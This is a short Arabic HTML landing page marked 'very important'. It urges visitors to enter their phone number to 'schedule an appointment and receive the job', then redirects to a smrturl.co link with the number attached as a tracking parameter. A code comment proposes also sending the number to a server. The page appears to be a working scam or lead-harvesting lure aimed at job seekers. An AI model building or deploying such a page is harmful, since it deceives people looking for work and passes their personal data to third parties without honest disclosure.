<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تأكيد التسجيل</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background-color: #f8f9fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
      color: #d9534f; /* لون تحذيري */
    }
    p {
      margin-bottom: 30px;
      font-size: 16px;
      color: #555;
    }
    input[type="tel"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      margin-bottom: 20px;
      border-radius: 8px;
      border: 1px solid #ccc;
      box-sizing: border-box;
      direction: ltr;
    }
    button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: none;
      background-color: #d9534f;
      color: white;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #c9302c;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>مهم جداً</h2>
    <p>يرجى تسجيل رقم هاتفك الآن لتحديد موعد واستلام الوظيفة.</p>
    <input type="tel" id="phone" placeholder="أدخل رقم هاتفك" pattern="[0-9]{10,15}" required />
    <button onclick="submitPhone()">تسجيل ورؤية العرض</button>
  </div>

  <script>
    function submitPhone() {
      const phone = document.getElementById('phone').value.trim();
      const phoneRegex = /^[0-9]{10,15}$/;
      if (!phoneRegex.test(phone)) {
        alert('الرجاء إدخال رقم هاتف صالح يتكون من 10 إلى 15 رقم.');
        return;
      }
      // ممكن هنا تضيف إرسال الرقم إلى سيرفر أو API قبل التحويل

      // بعد التحقق والتحويل
      window.location.href = "https://smrturl.co/a/sa7af109433/12011?s1=" + encodeURIComponent(phone);
    }
  </script>
</body>
</html>
